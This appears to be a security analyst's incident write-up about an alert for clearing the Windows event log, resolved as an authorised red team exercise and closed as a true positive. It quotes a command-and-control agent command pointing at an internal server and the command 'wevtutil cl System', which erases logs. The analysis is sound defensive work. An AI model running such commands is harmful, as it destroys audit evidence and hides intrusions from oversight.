**Alert:** Attempt to clear event log

**Endpoint:** ec2amaz-9oh9aqq

**User:** NT AUTHORITY\SYSTEM

**OS:** Windows Server 2022

**Verdict:** True positive 

<img width="597" height="298" alt="image" src="https://github.com/user-attachments/assets/d3e0c2fa-d6a9-4751-96fc-1c559f9a913d" />



**Image file path:** \Device\HarddiskVolume1\Windows\Temp\nssm\nssm-2.24-101-
g897c7ad\win64\nssm.exe

**Command Line:**

Some of commands are:

"wusvc.exe" -server http://172.31.2.203:8888 -group red

cmd.exe /C wevtutil cl System

**Why was the alert triggered?**

A process attempted to clear the event log.

**What was the Threat Actor trying to do?**

The red team tested hiding evidence of malicious activity.

**Which commands were used?**

cmd.exe /C wevtutil cl System

which spawned

wevtutil.exe cl System

This command completely clears the Windows System Event Log.

**Did it execute successfully?**

cmd.exe cleared the System event log

**Remediation:**

ServiceNow ticket raised with the Red Team to validate the activity

**Closure Notes:**

Investigation confirmed the alert was triggered by an authorised Red Team exercise. Validation was obtained through a ServiceNow request to the Red Team. No
unauthorised or malicious activity was identified. 

Incident closed as True Positive. 

The alert fired correctly because the exact conditions it was designed to detect actually occurred (a process attempting to clear the Windows System Event Log via wevtutil cl System). 

The fact that it was carried out by an authorized internal Red Team rather than an external malicious adversary changes the risk context, but it does not make the alert a false detection.



